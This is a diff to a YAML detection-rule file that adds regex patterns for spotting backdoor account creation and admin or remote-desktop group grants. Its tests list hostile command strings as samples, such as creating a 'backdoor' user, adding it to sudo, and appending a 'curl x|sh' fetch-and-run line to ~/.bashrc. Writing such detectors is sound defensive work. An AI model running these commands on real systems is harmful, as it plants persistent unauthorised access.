@@ -379,8 +379,19 @@ rules:
         - '>[ \t]{0,8}[^\n]{0,60}?(?:LaunchAgents|LaunchDaemons)'
         - '\bRegister-ScheduledTask\b|\bschtasks\s+/create\b'
         - 'CurrentVersion\\\\Run'
+        # A new account, or an existing one granted administration or remote login: a door that
+        # stays open after the script that made it is gone.
+        - '\bnet(?:\.exe)?\s{1,8}user\s{1,8}/add\b|\bnet(?:\.exe)?\s{1,8}user\s{1,8}\S{1,64}\s{1,8}\S{1,128}\s{1,8}/add\b'
+        - '\bnet(?:\.exe)?\s{1,8}localgroup\s{1,8}["\x27]?(?:[Aa]dministrators|[Rr]emote [Dd]esktop [Uu]sers)["\x27]?\s{1,8}\S{1,64}\s{1,8}/add\b'
+        - '\b(?:useradd|adduser)\s{1,8}(?:-[a-zA-Z]{1,8}\s{1,8}\S{0,64}\s{0,8}){0,6}\w'
+        - '\busermod\s{1,8}-[a-zA-Z]{0,4}G\s{1,8}\S{0,64}\b(?:sudo|wheel|admin)\b'
+        - '\bNew-LocalUser\b|\bAdd-LocalGroupMember\b[^\n]{0,80}(?:Administrators|Remote Desktop Users)'
     tests:
       positive:
+        - "net user /add flask 123qwe123"
+        - "net localgroup \"Remote Desktop Users\" flask /add"
+        - "useradd -m -s /bin/bash backdoor"
+        - "usermod -aG sudo backdoor"
         - "echo 'curl x|sh' >> ~/.bashrc"
         - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
         - "cp agent.service /etc/systemd/system/agent.service"
@@ -390,6 +401,8 @@ rules:
         - "cat ~/.bashrc"
         - "rm -f /etc/systemd/system/pihole-FTL.service"
         - "rm -rf /etc/systemd/system/pihole-FTL.service.d"
+        - "net user flask"
+        - "id -u someone"
 
   # ---------------------------------------------------------------------
   # Fetch-execute adjacency
